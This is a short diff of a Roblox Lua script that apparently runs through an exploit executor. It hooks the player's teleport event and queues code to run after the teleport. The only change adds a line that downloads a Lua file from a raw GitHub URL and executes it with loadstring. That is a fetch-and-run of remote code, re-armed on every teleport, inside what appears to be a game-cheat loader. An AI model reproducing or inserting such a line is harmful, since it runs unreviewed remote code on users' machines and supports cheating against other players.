@@ -1,7 +1,7 @@
 task.spawn(function()
 game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
     if State == Enum.TeleportState.Started then
-        queue_on_teleport([[]])
+        queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptSkiddie69/test/refs/heads/main/anomic.lua'))()")
     end
 end)
 end)
